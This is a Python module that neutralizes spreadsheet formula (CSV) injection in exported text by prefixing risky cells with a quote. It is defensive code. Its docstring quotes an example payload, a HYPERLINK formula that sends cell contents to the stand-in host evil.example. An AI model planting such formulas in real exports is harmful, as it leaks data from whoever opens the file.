"""Neutralize spreadsheet formulas in exported text.

A cell whose text starts with ``=``, ``+``, ``-``, ``@``, tab or carriage
return is evaluated as a formula by Excel / LibreOffice / Sheets when an export
is opened. Model names, notes and descriptions are user-entered, so a value
like ``=HYPERLINK("https://evil.example/?"&A1,"open")`` would run on the
admin's machine (CSV / formula injection). Such text is prefixed with ``'``,
which spreadsheets show as plain text. Real numbers (``-50.00``) are left
alone so amounts stay numeric.
"""
from __future__ import annotations

import csv
from typing import Any, Iterable

import pandas as pd

_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _is_number(text: str) -> bool:
    try:
        float(text.replace(",", ""))
    except ValueError:
        return False
    return True


def neutralize(value: Any) -> Any:
    """Return ``value`` with a leading ``'`` if it is text a spreadsheet would run."""
    if isinstance(value, str) and value and value[0] in _FORMULA_TRIGGERS and not _is_number(value):
        return "'" + value
    return value


def safe_df(df: pd.DataFrame) -> pd.DataFrame:
    """A copy of ``df`` with every text cell (and column name) neutralized."""
    out = df.copy()
    for column in out.columns:
        series = out[column]
        # pandas 3 stores text as its own string dtype, older pandas as object.
        if series.dtype == object or pd.api.types.is_string_dtype(series):
            out[column] = series.map(neutralize)
    out.columns = [neutralize(c) for c in out.columns]
    return out


class _SafeCsvWriter:
    def __init__(self, writer):
        self._writer = writer

    def writerow(self, row: Iterable[Any]):
        return self._writer.writerow([neutralize(cell) for cell in row])

    def writerows(self, rows: Iterable[Iterable[Any]]):
        for row in rows:
            self.writerow(row)


def safe_csv_writer(*args, **kwargs) -> _SafeCsvWriter:
    """``csv.writer`` that neutralizes every cell it writes."""
    return _SafeCsvWriter(csv.writer(*args, **kwargs))
